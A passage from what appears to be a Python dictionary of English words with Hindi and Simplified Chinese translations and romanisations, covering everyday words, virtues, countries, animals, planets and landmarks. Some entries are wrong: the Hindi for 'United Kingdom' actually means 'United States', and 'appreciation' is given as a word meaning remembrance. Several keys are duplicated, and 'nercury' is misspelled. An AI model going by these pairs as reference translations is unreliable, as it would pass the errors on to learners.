                "Hindi": "बच्चा (bachchā)",
                "Chinese (Simplified)": "孩子 (háizi)"
            },
            "hear": {
                "Hindi": "सुनना (sunnā)",
                "Chinese (Simplified)": "听 (tīng)"
            },
            "sea": {
                "Hindi": "समुद्र (samudra)",
                "Chinese (Simplified)": "海 (hǎi)"
            },
            "wall": {
                "Hindi": "दीवार (dīvār)",
                "Chinese (Simplified)": "墙 (qiáng)"
            },
            "nature": {
                "Hindi": "प्रकृति (prakṛti)",
                "Chinese (Simplified)": "自然 (zìrán)"
            },
            "milk": {
                "Hindi": "दूध (dūdh)",
                "Chinese (Simplified)": "牛奶 (niúnǎi)"
            },
            "air": {
                "Hindi": "हवा (havā)",
                "Chinese (Simplified)": "空气 (kōngqì)"
            },
            "hair": {
                "Hindi": "बाल (bāl)",
                "Chinese (Simplified)": "头发 (tóufǎ)"
            },    
            "bottle": {
                "Hindi": "बोतल (botal)",
                "Chinese (Simplified)": "瓶子 (píngzi)"
            },
            "fingers": {
                "Hindi": "उंगलियां (ungaliyāṇ)",
                "Chinese (Simplified)": "手指 (shǒuzhǐ)"
            },
            "lips": {
                "Hindi": "होठ (hoṭh)",
                "Chinese (Simplified)": "嘴唇 (zuǐchún)"
            },
            "pinch": {
                "Hindi": "चुटकी (chuṭkī)",
                "Chinese (Simplified)": "捏 (niē)"
            },
            "room": {
                "Hindi": "कमरा (kamrā)",
                "Chinese (Simplified)": "房间 (fángjiān)"
            },
            "season": {
                "Hindi": "ऋतु (ṛtu)",
                "Chinese (Simplified)": "季节 (jìjié)"
            },
            "fire": {
                "Hindi": "आग (āg)",
                "Chinese (Simplified)": "火 (huǒ)"
            },
            "baby": {
                "Hindi": "शिशु (śiśu)",
                "Chinese (Simplified)": "婴儿 (yīng'ér)"
            },
            "old": {
                "Hindi": "पुराना (purānā)",
                "Chinese (Simplified)": "旧 (jiù)"
            },
            "new": {
                "Hindi": "नया (nayā)",
                "Chinese (Simplified)": "新 (xīn)"
            },
            "tall": {
                "Hindi": "लंबा (lambā)",
                "Chinese (Simplified)": "高 (gāo)"
            },
            "short": {
                "Hindi": "छोटा (choṭā)",
                "Chinese (Simplified)": "短 (duǎn)"
            },
            "floor": {
                "Hindi": "फ़र्श (farś)",
                "Chinese (Simplified)": "地板 (dìbǎn)"
            },
            "balloon": {
                "Hindi": "गुब्बारा (gubbārā)",
                "Chinese (Simplified)": "气球 (qìqiú)"
            },
            "bowl": {
                "Hindi": "कटोरा (kaṭorā)",
                "Chinese (Simplified)": "碗 (wǎn)"
            },
            "festival": {
                "Hindi": "त्यौहार (tyauhār)",
                "Chinese (Simplified)": "节日 (jiérì)"
            },
            "up": {
                "Hindi": "ऊपर (ūpar)",
                "Chinese (Simplified)": "上 (shàng)"
            },
            "down": {
                "Hindi": "नीचे (nīche)",
                "Chinese (Simplified)": "下 (xià)"
            },
            "naughty": {
                "Hindi": "शरारती (śarāratī)",
                "Chinese (Simplified)": "调皮 (tiáopí)"
            },
            "smart": {
                "Hindi": "स्मार्ट (smart)",
                "Chinese (Simplified)": "聪明 (cōngmíng)"
            },
            "moron": {
                "Hindi": "मूर्ख (mūrkh)",
                "Chinese (Simplified)": "笨蛋 (bèndàn)"
            },
            "resident": {
                "Hindi": "निवासी (nivāsī)",
                "Chinese (Simplified)": "居民 (jūmín)"
            },
            "evil": {
                "Hindi": "बुराई (burāī)",
                "Chinese (Simplified)": "邪恶 (xié'è)"
            },
            "thief": {
                "Hindi": "चोर (chor)",
                "Chinese (Simplified)": "小偷 (xiǎotōu)"
            },
            "police": {
                "Hindi": "पुलिस (pulis)",
                "Chinese (Simplified)": "警察 (jǐngchá)"
            },
            "shadow": {
                "Hindi": "छाया (chhāyā)",
                "Chinese (Simplified)": "影子 (yǐngzi)"
            },
            "bright": {
                "Hindi": "चमकदार (chamakdār)",
                "Chinese (Simplified)": "明亮 (míngliàng)"
            },
            "sound": {
                "Hindi": "ध्वनि (dhvani)",
                "Chinese (Simplified)": "声音 (shēngyīn)"
            },
            "silence": {
                "Hindi": "शांति (śānti)",
                "Chinese (Simplified)": "沉默 (chénmò)"
            },
            "silent": {
                "Hindi": "मौन (maun)",
                "Chinese (Simplified)": "安静 (ānjìng)"
            },
            "supermarket": {
                "Hindi": "सुपरमार्केट (suparmārkeṭ)",
                "Chinese (Simplified)": "超市 (chāoshì)"
            },
            "button": {
                "Hindi": "बटन (baṭan)",
                "Chinese (Simplified)": "按钮 (ànniǔ)"
            },
            "left": {
                "Hindi": "बाएँ (bāẽ)",
                "Chinese (Simplified)": "左 (zuǒ)"
            },
            "right": {
                "Hindi": "दाएँ (dāẽ)",
                "Chinese (Simplified)": "右 (yòu)"
            },
            "hole": {
                "Hindi": "छेद (chhed)",
                "Chinese (Simplified)": "洞 (dòng)"
            },
            "whole": {
                "Hindi": "संपूर्ण (sampūrṇ)",
                "Chinese (Simplified)": "整体 (zhěngtǐ)"
            },
            "all": {
                "Hindi": "सभी (sabhī)",
                "Chinese (Simplified)": "所有 (suǒyǒu)"
            },
            "empty": {
                "Hindi": "खाली (khālī)",
                "Chinese (Simplified)": "空 (kōng)"
            },
            "part": {
                "Hindi": "भाग (bhāg)",
                "Chinese (Simplified)": "部分 (bùfèn)"
            },
            "game": {
                "Hindi": "खेल (khel)",
                "Chinese (Simplified)": "游戏 (yóuxì)"
            },
            "grace": {
                "Chinese (Simplified)": "优雅 (yōu yǎ)",
                "Hindi": "कृपा (kripā)"
            },
            "honesty": {
                "Chinese (Simplified)": "诚实 (chéng shí)",
                "Hindi": "ईमानदारी (īmāndārī)"
            },
            "loyal": {
                "Chinese (Simplified)": "忠诚 (zhōng chéng)",
                "Hindi": "निष्ठावान (niṣṭhāvān)"
            },
            "understand": {
                "Chinese (Simplified)": "理解 (lǐ jiě)",
                "Hindi": "समझना (samajhnā)"
            },
            "compassion": {
                "Chinese (Simplified)": "同情 (tóng qíng)",
                "Hindi": "दया (dayā)"
            },
            "openness": {
                "Chinese (Simplified)": "开放 (kāi fàng)",
                "Hindi": "खुलापन (khulāpan)"
            },
            "communication": {
                "Chinese (Simplified)": "沟通 (gōu tōng)",
                "Hindi": "संचार (sanchār)"
            },
            "transformation": {
                "Chinese (Simplified)": "转变 (zhuǎn biàn)",
                "Hindi": "रूपांतरण (rūpāntaraṇ)"
            },
            "adversity": {
                "Chinese (Simplified)": "逆境 (nì jìng)",
                "Hindi": "कठिनाई (kaṭhināī)"
            },
            "appreciation": {
                "Chinese (Simplified)": "欣赏 (xīn shǎng)",
                "Hindi": "स्मरण (smaraṇ)"
            },
            "balance": {
                "Chinese (Simplified)": "平衡 (píng héng)",
                "Hindi": "संतुलन (santulan)"
            },
            "mindfulness": {
                "Chinese (Simplified)": "正念 (zhèng niàn)",
                "Hindi": "सचेतता (sacētatā)"
            },
            "empower": {
                "Chinese (Simplified)": "赋能 (fù néng)",
                "Hindi": "सशक्त बनाना (saśakt banānā)"
            },
            "reflection": {
                "Chinese (Simplified)": "反思 (fǎn sī)",
                "Hindi": "प्रतिबिंब (pratibimb)"
            },
            "courageous": {
                "Chinese (Simplified)": "勇敢 (yǒng gǎn)",
                "Hindi": "साहसी (sāhasī)"
            },
            "gratitude": {
                "Chinese (Simplified)": "感恩 (gǎn ēn)",
                "Hindi": "आभार (ābhār)"
            },
            "respectful": {
                "Chinese (Simplified)": "尊重 (zūn zhòng)",
                "Hindi": "आदरपूर्ण (ādar pūrṇ)"
            },
            "collaboration": {
                "Chinese (Simplified)": "合作 (hé zuò)",
                "Hindi": "सहयोग (sahyog)"
            },
            "determination": {
                "Chinese (Simplified)": "决心 (jué xīn)",
                "Hindi": "निश्चय (niśchay)"
            },
            "enrich": {
                "Chinese (Simplified)": "丰富 (fēng fù)",
                "Hindi": "समृद्ध करना (samṛddh karnā)"
            },
            "serenity": {
                "Chinese (Simplified)": "宁静 (níng jìng)",
                "Hindi": "शांति (shānti)"
            },
            "strength": {
                "Chinese (Simplified)": "力量 (lì liàng)",
                "Hindi": "शक्ति (shakti)"
            },
            "peace": {
                "Chinese (Simplified)": "和平 (hé píng)",
                "Hindi": "शांति (shānti)"
            },
            "health": {
                "Chinese (Simplified)": "健康 (jiàn kāng)",
                "Hindi": "स्वास्थ्य (svāsthya)"
            },
            "hope": {
                "Chinese (Simplified)": "希望 (xī wàng)",
                "Hindi": "आशा (āshā)"
            },
            "courage": {
                "Chinese (Simplified)": "勇气 (yǒng qì)",
                "Hindi": "साहस (sāhas)"
            },
            "knowledge": {
                "Chinese (Simplified)": "知识 (zhī shi)",
                "Hindi": "ज्ञान (gyān)"
            },
            "opportunity": {
                "Chinese (Simplified)": "机会 (jī huì)",
                "Hindi": "अवसर (avsar)"
            },
            "friendship": {
                "Chinese (Simplified)": "友谊 (yǒu yì)",
                "Hindi": "मित्रता (mitratā)"
            },
            "loyalty": {
                "Chinese (Simplified)": "忠诚 (zhōng chéng)",
                "Hindi": "निष्ठा (niṣṭhā)"
            },
            "imagination": {
                "Chinese (Simplified)": "想象 (xiǎng xiàng)",
                "Hindi": "कल्पना (kalpanā)"
            },
            "wisdom": {
                "Chinese (Simplified)": "智慧 (zhì huì)",
                "Hindi": "बुद्धिमत्ता (buddhimattā)"
            },
            "bravery": {
                "Chinese (Simplified)": "勇敢 (yǒng gǎn)",
                "Hindi": "वीरता (vīrtā)"
            },
            "patience": {
                "Chinese (Simplified)": "耐心 (nài xīn)",
                "Hindi": "धैर्य (dhairya)"
            },
            "journey": {
                "Chinese (Simplified)": "旅行 (lǚ xíng)",
                "Hindi": "यात्रा (yātrā)"
            },
            "dream": {
                "Chinese (Simplified)": "梦想 (mèng xiǎng)",
                "Hindi": "सपना (sapnā)"
            },
            "kindness": {
                "Chinese (Simplified)": "善良 (shàn liáng)",
                "Hindi": "दयालुता (dayālutā)"
            },
            "honor": {
                "Chinese (Simplified)": "荣誉 (róng yù)",
                "Hindi": "सम्मान (sammān)"
            },
            "trust": {
                "Chinese (Simplified)": "信任 (xìn rèn)",
                "Hindi": "विश्वास (vishwās)"
            },
            "teamwork": {
                "Chinese (Simplified)": "团队合作 (tuán duì hé zuò)",
                "Hindi": "टीमवर्क (ṭīmvarq)"
            },
            "door": {
                "Chinese (Simplified)": "门 (mén)",
                "Hindi": "दरवाज़ा (darwaza)"
            },
            "window": {
                "Chinese (Simplified)": "窗户 (chuāng hu)",
                "Hindi": "खिड़की (khidki)"
            },
            "animal": {
                "Chinese (Simplified)": "动物 (dòng wù)",
                "Hindi": "जानवर (jaanvar)"
            },
            "bird": {
                "Chinese (Simplified)": "鸟 (niǎo)",
                "Hindi": "पक्षी (pakshi)"
            },
            "fish": {
                "Chinese (Simplified)": "鱼 (yú)",
                "Hindi": "मछली (machhli)"
            },
            "dream": {
                "Chinese (Simplified)": "梦 (mèng)",
                "Hindi": "सपना (sapna)"
            },
            "dance": {
                "Chinese (Simplified)": "跳舞 (tiào wǔ)",
                "Hindi": "नृत्य (nritya)"
            },
            "family": {
                "Chinese (Simplified)": "家庭 (jiā tíng)",
                "Hindi": "परिवार (parivaar)"
            },
            "money": {
                "Chinese (Simplified)": "钱 (qián)",
                "Hindi": "पैसा (paisaa)"
            },
            "health": {
                "Chinese (Simplified)": "健康 (jiàn kāng)",
                "Hindi": "स्वास्थ्य (swasthya)"
            },
            "strength": {
                "Chinese (Simplified)": "力量 (lì liàng)",
                "Hindi": "ताकत (taakat)"
            },
            "moon": {
                "Chinese (Simplified)": "月亮 (yuè liàng)",
                "Hindi": "चंद्रमा (chandramā)"
            },
            "star": {
                "Chinese (Simplified)": "星星 (xīng xing)",
                "Hindi": "तारा (tārā)"
            },
            "cloud": {
                "Chinese (Simplified)": "云 (yún)",
                "Hindi": "बादल (bādal)"
            },
            "rain": {
                "Chinese (Simplified)": "雨 (yǔ)",
                "Hindi": "बारिश (bārish)"
            },
            "snow": {
                "Chinese (Simplified)": "雪 (xuě)",
                "Hindi": "बर्फ़ (barf)"
            },
            "mountain range": {
                "Chinese (Simplified)": "山脉 (shān mài)",
                "Hindi": "पर्वत श्रृंखला (parvat shrinkhalā)"
            },
            "valley": {
                "Chinese (Simplified)": "山谷 (shān gǔ)",
                "Hindi": "घाटी (ghātī)"
            },
            "desert": {
                "Chinese (Simplified)": "沙漠 (shā mò)",
                "Hindi": "रेगिस्तान (registān)"
            },
            "island": {
                "Chinese (Simplified)": "岛 (dǎo)",
                "Hindi": "द्वीप (dvīp)"
            },
            "lake": {
                "Chinese (Simplified)": "湖 (hú)",
                "Hindi": "झील (jheel)"
            },
            "riverbank": {
                "Chinese (Simplified)": "河岸 (hé àn)",
                "Hindi": "नदी का किनारा (nadi kā kinārā)"
            },
            "cave": {
                "Chinese (Simplified)": "洞穴 (dòng xué)",
                "Hindi": "गुफा (gufā)"
            },
            "waterfall": {
                "Chinese (Simplified)": "瀑布 (pù bù)",
                "Hindi": "झरना (jharanā)"
            },
            "earthquake": {
                "Chinese (Simplified)": "地震 (dì zhèn)",
                "Hindi": "भूकंप (bhūkamp)"
            },
            "volcano": {
                "Chinese (Simplified)": "火山 (huǒ shān)",
                "Hindi": "ज्वालामुखी (jvālāmukhī)"
            },
            "lightning": {
                "Chinese (Simplified)": "闪电 (shǎn diàn)",
                "Hindi": "बिजली (bijlī)"
            },
            "thunder": {
                "Chinese (Simplified)": "雷声 (léi shēng)",
                "Hindi": "गरज (garaj)"
            },
            "rainbow": {
                "Chinese (Simplified)": "彩虹 (cǎi hóng)",
                "Hindi": "इंद्रधनुष (indradhanush)"
            },
            "sunrise": {
                "Chinese (Simplified)": "日出 (rì chū)",
                "Hindi": "सूर्योदय (sūryoday)"
            },
            "sunset": {
                "Chinese (Simplified)": "日落 (rì luò)",
                "Hindi": "सूर्यास्त (sūryāst)"
            },
            "vision": {
                "Chinese (Simplified)": "视野 (shì yě)",
                "Hindi": "दृष्टि (dṛṣṭi)"
            },
            "god": {
                "Chinese (Simplified)": "上帝 Shàngdì",
                "Hindi": "भगवान (bhagwaan)"  
            },
            "independence": {
                "Chinese (Simplified)": "独立 (dú lì)",
                "Hindi": "स्वतंत्रता (svatantratā)"
            },
            "balance": {
                "Chinese (Simplified)": "平衡 (píng héng)",
                "Hindi": "संतुलन (santulan)"
            },
            "equality": {
                "Chinese (Simplified)": "平等 (píng děng)",
                "Hindi": "समानता (samāntā)"
            },
            "transparency": {
                "Chinese (Simplified)": "透明 (tòu míng)",
                "Hindi": "पारदर्शिता (pārdarśitā)"
            },
            "faith": {
                "Chinese (Simplified)": "信仰 (xìn yǎng)",
                "Hindi": "विश्वास (viśvās)"
            },
            "diversity": {
                "Chinese (Simplified)": "多样性 (duō yàng xìng)",
                "Hindi": "विविधता (vividhatā)"
            },
            "curiosity": {
                "Chinese (Simplified)": "好奇心 (hào qí xīn)",
                "Hindi": "जिज्ञासा (jijñāsā)"
            },
            "innovation": {
                "Chinese (Simplified)": "创新 (chuàng xīn)",
                "Hindi": "नवाचार (navācār)"
            },
            "gratitude": {
                "Chinese (Simplified)": "感恩 (gǎn ēn)",
                "Hindi": "आभार (ābhār)"
            },
            "integrity": {
                "Chinese (Simplified)": "正直 (zhèng zhí)",
                "Hindi": "ईमानदारी (īmāndārī)"
            },
            "hope": {
                "Chinese (Simplified)": "希望 (xī wàng)",
                "Hindi": "आशा (āśā)"
            },
            "strength": {
                "Chinese (Simplified)": "力量 (lì liàng)",
                "Hindi": "शक्ति (śakti)"
            },
            "patience": {
                "Chinese (Simplified)": "耐心 (nài xīn)",
                "Hindi": "धैर्य (dhairya)"
            },
            "wisdom": {
                "Chinese (Simplified)": "智慧 (zhì huì)",
                "Hindi": "ज्ञान (jñān)"
            },
            "creativity": {
                "Chinese (Simplified)": "创造力 (chuàng zào lì)",
                "Hindi": "रचनात्मकता (rāchnātmaktā)"
            },
            "empowerment": {
                "Chinese (Simplified)": "赋能 (fù néng)",
                "Hindi": "सशक्तिकरण (saśaktikaraṇ)"
            },
            "legacy": {
                "Chinese (Simplified)": "遗产 (yí chǎn)",
                "Hindi": "विरासत (virāsat)"
            },
            "contribution": {
                "Chinese (Simplified)": "贡献 (gòng xiàn)",
                "Hindi": "योगदान (yogdān)"
            },
            "opportunity": {
                "Chinese (Simplified)": "机会 (jī huì)",
                "Hindi": "अवसर (avsar)"
            },
            "courage": {
                "Chinese (Simplified)": "勇气 (yǒng qì)",
                "Hindi": "साहस (sāhas)"
            },
            "perspective": {
                "Chinese (Simplified)": "视角 (shì jiǎo)",
                "Hindi": "दृष्टिकोण (dṛṣṭikoṇa)"
            },
            "ambition": {
                "Chinese (Simplified)": "雄心 (xióng xīn)",
                "Hindi": "महत्वाकांक्षा (mahatvākāṅkṣā)"
            },
            "determination": {
                "Chinese (Simplified)": "决心 (jué xīn)",
                "Hindi": "निश्चय (niśchay)"
            },
            "serenity": {
                "Chinese (Simplified)": "宁静 (níng jìng)",
                "Hindi": "शांति (shānti)"
            },
            "balance": {
                "Chinese (Simplified)": "平衡 (píng héng)",
                "Hindi": "संतुलन (santulan)"
            },
            "truth": {
                "Chinese (Simplified)": "真理 (zhēn lǐ)",
                "Hindi": "सत्य (satya)"
            },
            "China": { #Countries
                "Chinese (Simplified)": "中国 (Zhōngguó)",
                "Hindi": "चीन (Chīn)"
            },
            "japan": {
                "Chinese (Simplified)": "日本 (Rìběn)",
                "Hindi": "जापान (Jāpān)"
            },
            "france": {
                "Chinese (Simplified)": "法国 (Fàguó)",
                "Hindi": "फ्रांस (Frāns)"
            },
            "australia": {
                "Chinese (Simplified)": "澳大利亚 (Àodàlìyà)",
                "Hindi": "ऑस्ट्रेलिया (Ōsṭrelīyā)"
            },
            "mexico": {
                "Chinese (Simplified)": "墨西哥 (Mòxīgē)",
                "Hindi": "मैक्सिको (Maiksikō)"
            },
            "south Korea": {
                "Chinese (Simplified)": "韩国 (Hánguó)",
                "Hindi": "दक्षिण कोरिया (Dakṣiṇ Kōrīyā)"
            },
            "italy": {
                "Chinese (Simplified)": "意大利 (Yìdàlì)",
                "Hindi": "इटली (Iṭlī)"
            },
            "spain": {
                "Chinese (Simplified)": "西班牙 (Xībānyá)",
                "Hindi": "स्पेन (Spēn)"
            },
            "south Africa": {
                "Chinese (Simplified)": "南非 (Nánfēi)",
                "Hindi": "दक्षिण अफ्रीका (Dakṣiṇ Afrīkā)"
            },
            "argentina": {
                "Chinese (Simplified)": "阿根廷 (Āgēntíng)",
                "Hindi": "अर्जेंटीना (Arjenṭīnā)"
            },
            "saudi Arabia": {
                "Chinese (Simplified)": "沙特阿拉伯 (Shātè Ālābó)",
                "Hindi": "सऊदी अरब (Saudī Arab)"
            },
            "pakistan": {
                "Chinese (Simplified)": "巴基斯坦 (Bājīsītǎn)",
                "Hindi": "पाकिस्तान (Pākistān)"
            },
            "thailand": {
                "Chinese (Simplified)": "泰国 (Tàiguó)",
                "Hindi": "थाईलैंड (Thā'īlānḍ)"
            },
            "malaysia": {
                "Chinese (Simplified)": "马来西亚 (Mǎláixīyà)",
                "Hindi": "मलेशिया (Malēśiyā)"
            },
            "israel": {
                "Chinese (Simplified)": "以色列 (Yǐsèliè)",
                "Hindi": "इज़राइल (Izrā'īl)"
            },
            "singapore": {
                "Chinese (Simplified)": "新加坡 (Xīnjiāpō)",
                "Hindi": "सिंगापुर (Siṅgāpūr)"
            },
            "nigeria": {
                "Chinese (Simplified)": "尼日利亚 (Nírìlìyà)",
                "Hindi": "नाइजीरिया (Nā'ījīriyā)"
            },
            "philippines": {
                "Chinese (Simplified)": "菲律宾 (Fēilǜbīn)",
                "Hindi": "फ़िलिपीन्स (Philīpīnsa)"
            },
            "belgium": {
                "Chinese (Simplified)": "比利时 (Bǐlìshí)",
                "Hindi": "बेल्जियम (Beljiam)"
            },
            "brazil": {
                "Chinese (Simplified)": "巴西 (Bāxī)",
                "Hindi": "ब्राज़ील (Brāzīl)"
            },
            "canada": {
                "Chinese (Simplified)": "加拿大 (Jiānádà)",
                "Hindi": "कनाडा (Kanāḍā)"
            },
            "chile": {
                "Chinese (Simplified)": "智利 (Zhìlì)",
                "Hindi": "चिली (Chilī)"
            },
            "denmark": {
                "Chinese (Simplified)": "丹麦 (Dānmài)",
                "Hindi": "डेनमार्क (Ḍenmārk)"
            },
            "egypt": {
                "Chinese (Simplified)": "埃及 (Āijí)",
                "Hindi": "मिस्र (Misr)"
            },
            "finland": {
                "Chinese (Simplified)": "芬兰 (Fēnlán)",
                "Hindi": "फिनलैंड (Finlāṇḍ)"
            },
            "germany": {
                "Chinese (Simplified)": "德国 (Déguó)",
                "Hindi": "जर्मनी (Jarmani)"
            },
            "greece": {
                "Chinese (Simplified)": "希腊 (Xīlà)",
                "Hindi": "ग्रीस (Grīs)"
            },
            "hungary": {
                "Chinese (Simplified)": "匈牙利 (Xiōngyálì)",
                "Hindi": "हंगरी (Haṅgarī)"
            },
            "india": {
                "Chinese (Simplified)": "印度 (Yìndù)",
                "Hindi": "भारत (Bhārat)"
            },
            "indonesia": {
                "Chinese (Simplified)": "印度尼西亚 (Yìndùníxīyà)",
                "Hindi": "इंडोनेशिया (Iṇḍonēśiyā)"
            },
            "netherlands": {
                "Chinese (Simplified)": "荷兰 (Hélán)",
                "Hindi": "नीदरलैंड (Nīdaralēnḍ)"
            },
            "new Zealand": {
                "Chinese (Simplified)": "新西兰 (Xīnxīlán)",
                "Hindi": "न्यू ज़ीलैंड (Nyū Zīlānḍ)"
            },
            "norway": {
                "Chinese (Simplified)": "挪威 (Nuówēi)",
                "Hindi": "नॉर्वे (Nŏrvē)"
            },
            "poland": {
                "Chinese (Simplified)": "波兰 (Bōlán)",
                "Hindi": "पोलैंड (Polāṇḍ)"
            },
            "russia": {
                "Chinese (Simplified)": "俄罗斯 (Èluósī)",
                "Hindi": "रूस (Rūs)"
            },
            "sweden": {
                "Chinese (Simplified)": "瑞典 (Ruìdiǎn)",
                "Hindi": "स्वीडन (Swīḍan)"
            },
            "switzerland": {
                "Chinese (Simplified)": "瑞士 (Ruìshì)",
                "Hindi": "स्विट्ज़रलैंड (Swiṭzarlēnḍ)"
            },
            "turkey": {
                "Chinese (Simplified)": "土耳其 (Tǔ'ěrqí)",
                "Hindi": "तुर्की (Turkī)"
            },
            "united Kingdom": {
                "Chinese (Simplified)": "英国 (Yīngguó)",
                "Hindi": "संयुक्त राज्य (Saṁyukta Rājya)"
            },
            "united States": {
                "Chinese (Simplified)": "美国 (Měiguó)",
                "Hindi": "संयुक्त राज्य अमेरिका (Saṁyukta Rājya Amērikā)"
            },
            "venezuela": {
                "Chinese (Simplified)": "委内瑞拉 (Wěinèiruìlā)",
                "Hindi": "वेनेज़ुएला (Venēzū'ēlā)"
            },
            "vietnam": {
                "Chinese (Simplified)": "越南 (Yuènán)",
                "Hindi": "वियतनाम (Viyanām)"
            },
            "dog": { #Animals
                "Chinese (Simplified)": "狗 (gǒu)",
                "Hindi": "कुत्ता (Kuttā)"
            },
            "cat": {
                "Chinese (Simplified)": "猫 (māo)",
                "Hindi": "बिल्ली (Billī)"
            },
            "elephant": {
                "Chinese (Simplified)": "大象 (dà xiàng)",
                "Hindi": "हाथी (Hāthī)"
            },
            "tiger": {
                "Chinese (Simplified)": "老虎 (lǎo hǔ)",
                "Hindi": "बाघ (Bāgh)"
            },
            "lion": {
                "Chinese (Simplified)": "狮子 (shī zi)",
                "Hindi": "शेर (Sher)"
            },
            "cow": {
                "Chinese (Simplified)": "牛 (niú)",
                "Hindi": "गाय (Gāy)"
            },
            "horse": {
                "Chinese (Simplified)": "马 (mǎ)",
                "Hindi": "घोड़ा (Ghoṛā)"
            },
            "monkey": {
                "Chinese (Simplified)": "猴子 (hóu zi)",
                "Hindi": "बंदर (Bandar)"
            },
            "rabbit": {
                "Chinese (Simplified)": "兔子 (tù zi)",
                "Hindi": "खरगोश (Khargosh)"
            },
            "deer": {
                "Chinese (Simplified)": "鹿 (lù)",
                "Hindi": "हिरण (Hiraṇ)"
            },
            "bear": {
                "Chinese (Simplified)": "熊 (xióng)",
                "Hindi": "भालू (Bhālū)"
            },
            "wolf": {
                "Chinese (Simplified)": "狼 (láng)",
                "Hindi": "भेड़िया (Bheṛiyā)"
            },
            "sheep": {
                "Chinese (Simplified)": "羊 (yáng)",
                "Hindi": "भेड़ (Bheṛ)"
            },
            "goat": {
                "Chinese (Simplified)": "山羊 (shān yáng)",
                "Hindi": "बकरी (Bakrī)"
            },
            "pig": {
                "Chinese (Simplified)": "猪 (zhū)",
                "Hindi": "सुअर (Su’ar)"
            },
            "fox": {
                "Chinese (Simplified)": "狐狸 (hú lí)",
                "Hindi": "लोमड़ी (Lomaṛī)"
            },
            "frog": {
                "Chinese (Simplified)": "青蛙 (qīng wā)",
                "Hindi": "मेंढक (Meṇḍhak)"
            },
            "snake": {
                "Chinese (Simplified)": "蛇 (shé)",
                "Hindi": "साँप (Sāṅp)"
            },
            "fish": {
                "Chinese (Simplified)": "鱼 (yú)",
                "Hindi": "मछली (Machhalī)"
            },
            "dolphin": {
                "Chinese (Simplified)": "海豚 (hǎi tún)",
                "Hindi": "डॉल्फिन (Dolphin)"
            },
            "whale": {
                "Chinese (Simplified)": "鲸鱼 (jīng yú)",
                "Hindi": "व्हेल (Vheil)"
            },
            "crocodile": {
                "Chinese (Simplified)": "鳄鱼 (è yú)",
                "Hindi": "मगरमच्छ (Magarmachchh)"
            },
            "peacock": {
                "Chinese (Simplified)": "孔雀 (kǒng què)",
                "Hindi": "मोर (Mor)"
            },
            "parrot": {
                "Chinese (Simplified)": "鹦鹉 (yīng wǔ)",
                "Hindi": "तोता (Totā)"
            },
            "chicken": {
                "Chinese (Simplified)": "鸡 (jī)",
                "Hindi": "मुर्गी (Murgī)"
            },
            "duck": {
                "Chinese (Simplified)": "鸭子 (yā zi)",
                "Hindi": "बतख (Batakh)"
            },
            "camel": {
                "Chinese (Simplified)": "骆驼 (luò tuó)",
                "Hindi": "ऊँट (Ūṅṭ)"
            },
            "zebra": {
                "Chinese (Simplified)": "斑马 (bān mǎ)",
                "Hindi": "ज़ेबरा (Zebarā)"
            },
            "giraffe": {
                "Chinese (Simplified)": "长颈鹿 (cháng jǐng lù)",
                "Hindi": "जिराफ़ (Jirāf)"
            },
            "panda": {
                "Chinese (Simplified)": "熊猫 (xióng māo)",
                "Hindi": "पांडा (Pāṇḍā)"
            },
            "kangaroo": {
                "Chinese (Simplified)": "袋鼠 (dài shǔ)",
                "Hindi": "कंगारू (Kaṅgārū)"
            },
            "nercury": { #Planets
                "Chinese (Simplified)": "水星 (shuǐ xīng)",
                "Hindi": "बुध (budh)"
            },
            "venus": {
                "Chinese (Simplified)": "金星 (jīn xīng)",
                "Hindi": "शुक्र (shukra)"
            },
            "earth": {
                "Chinese (Simplified)": "地球 (dì qiú)",
                "Hindi": "पृथ्वी (prithvi)"
            },
            "mars": {
                "Chinese (Simplified)": "火星 (huǒ xīng)",
                "Hindi": "मंगल (mangal)"
            },
            "jupiter": {
                "Chinese (Simplified)": "木星 (mù xīng)",
                "Hindi": "बृहस्पति (brihaspati)"
            },
            "saturn": {
                "Chinese (Simplified)": "土星 (tǔ xīng)",
                "Hindi": "शनि (shani)"
            },
            "uranus": {
                "Chinese (Simplified)": "天王星 (tiān wáng xīng)",
                "Hindi": "अरुण (arun)"
            },
            "neptune": {
                "Chinese (Simplified)": "海王星 (hǎi wáng xīng)",
                "Hindi": "वरुण (varun)"
            },
            "pluto": {
                "Chinese (Simplified)": "冥王星 (míng wáng xīng)",
                "Hindi": "यम (yam)"
            },
            "taj mahal": {
                "Chinese (Simplified)": "泰姬陵 (Tài jī líng)",
                "Hindi": "ताजमहल (Taj Mahal)"
            },
            "great wall of china": {
                "Chinese (Simplified)": "长城 (Cháng chéng)",
                "Hindi": "चीन की महान दीवार (Cheen ki mahaan deewar)"
            },
            "eiffel tower": {
                "Chinese (Simplified)": "埃菲尔铁塔 (Āi fēi ěr tiě tǎ)",
                "Hindi": "आइफ़िल टॉवर (Aifel Tower)"
            },
            "statue of liberty": {
                "Chinese (Simplified)": "自由女神像 (Zì yóu nǚ shén xiàng)",
                "Hindi": "स्वतंत्रता की मूर्ति (Swatantrata ki moorti)"
            },
            "machu picchu": {
                "Chinese (Simplified)": "马丘比丘 (Mǎ qiū bǐ qiū)",
                "Hindi": "माचू पिच्चू (Machu Picchu)"
            },
            "colosseum": {
                "Chinese (Simplified)": "斗兽场 (Dòu shòu chǎng)",
                "Hindi": "कोलोसियम (Colosseum)"
            },
            "sydney opera house": {
                "Chinese (Simplified)": "悉尼歌剧院 (Xī ní gē jù yuàn)",
                "Hindi": "सिडनी ओपेरा हाउस (Sidney Opera House)"
            },
            "burj khalifa": {
                "Chinese (Simplified)": "哈利法塔 (Hā lì fǎ tǎ)",
                "Hindi": "बुर्ज खलीफा (Burj Khalifa)"
            },
            "pyramids of giza": {
                "Chinese (Simplified)": "吉萨金字塔 (Jí sà jīn zì tǎ)",
                "Hindi": "गीज़ा के पिरामिड (Giza ke Pyramids)"
            },
            "golden gate bridge": {
                "Chinese (Simplified)": "金门大桥 (Jīn mén dà qiáo)",
                "Hindi": "गोल्डन गेट ब्रिज (Golden Gate Bridge)"
            },
            "mount everest": {
                "Chinese (Simplified)": "珠穆朗玛峰 (Zhū mù lǎng mǎ fēng)",
                "Hindi": "माउंट एवरेस्ट (Mount Everest)"
            },
            "stonehenge": {
                "Chinese (Simplified)": "巨石阵 (Jù shí zhèn)",
                "Hindi": "स्टोनहेंज (Stonehenge)"
            },
            "angkor wat": {
                "Chinese (Simplified)": "吴哥窟 (Wú gē kū)",
                "Hindi": "अंगकोर वाट (Angkor Wat)"
            },
            "petra": {
                "Chinese (Simplified)": "佩特拉 (Pèi tè lā)",
                "Hindi": "पेट्रा (Petra)"
            },
            "big ben": {
